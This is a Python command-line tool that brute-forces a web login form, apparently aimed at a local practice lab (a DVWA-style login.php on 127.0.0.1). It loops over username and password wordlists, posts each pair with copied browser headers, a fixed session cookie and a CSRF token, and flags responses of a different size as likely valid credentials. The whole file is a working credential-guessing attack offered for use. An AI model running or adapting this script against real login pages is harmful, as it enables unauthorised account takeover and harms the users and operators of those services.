import os
import sys
import requests
import warnings
import pyfiglet
import argparse

# Suppress InsecureRequestWarning
warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made.*")

url = "http://127.0.0.1:42001/login.php"
headers = {
    "Host": "127.0.0.1:42001",
    "Cache-Control": "max-age=0",
    "sec-ch-ua": '"Not_A Brand";v="99", "Chromium";v="142"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "http://127.0.0.1:42001",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "http://127.0.0.1:42001/login.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "security=impossible; PHPSESSID=6da36b4092ea5eb97672127495226187",
    "Connection": "keep-alive",
}

session = requests.Session()
expected_response_size = None
different_attempts = []

text = "Anub1s!"
# Use figlet_format to convert the string into an ASCII art representation
ascii_art = pyfiglet.figlet_format(text) 

# Large ASCII Art Header for "ANUB1S"
HEADER = ascii_art

def clear_screen():
    print('\033[2J\033[H', end='')

def print_header():
    print(HEADER)

def get_list(input_value, prompt):
    if input_value is None:
        input_value = input(prompt).strip()
    if os.path.isfile(input_value):
        with open(input_value, 'r', encoding='latin-1') as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [input_value]

def PostReq(usernames, passwords):
    for mail in usernames:
        for Password in passwords:
            data = {
                "username": mail,
                "password": Password,
                "Login": "Login",
                "user_token": "97e491cec3a9912cb48775a012aa0ad8"
            }
            SendReq(session, url, headers, data, mail, Password) 

def SendReq(session, url, headers, data, mail, Password):
    global expected_response_size, different_attempts
    request_body = '&'.join([f"{k}={v}" for k, v in data.items()])
    request_size = len(request_body.encode('utf-8'))
    response = session.post(url, headers=headers, data=data, verify=False)
    response_size = len(response.content)
    
    # Clear screen and print header
    clear_screen()
    print_header()
    
    # Print current attempt info
    print(f"Request Size: {request_size}")
    print(f"Tested Username: {mail}, Password: {Password}")
    if expected_response_size is None:
        expected_response_size = response_size
        print("Expected response size set to:", expected_response_size)
    elif response_size != expected_response_size:
        print("*** DIFFERENT RESPONSE SIZE DETECTED! ***")
        different_attempts.append((request_size, mail, Password, response_size))
    print("Response Size:", response_size)
    print("-------------------------------------\n")

def main():
    parser = argparse.ArgumentParser(description="Brute force login script")
    parser.add_argument('-u', '--username', help='Username or path to username wordlist')
    parser.add_argument('-p', '--password', help='Password or path to password wordlist')
    args = parser.parse_args()

    usernames = get_list(args.username, "Enter username or path to username wordlist: ")
    passwords = get_list(args.password, "Enter password or path to password wordlist: ")

    PostReq(usernames, passwords)
    # After all attempts, print summary without clearing
    print("Summary of different response sizes:")
    for req_size, user, pwd, resp_size in different_attempts:
        print(f"Request Size: {req_size}")
        print(f"Tested Username: {user}, Password: {pwd}")
        print("*** DIFFERENT RESPONSE SIZE DETECTED! ***")
        print(f"Response Size: {resp_size}")
        print("-------------------------------------\n")

if __name__ == "__main__":
    main()

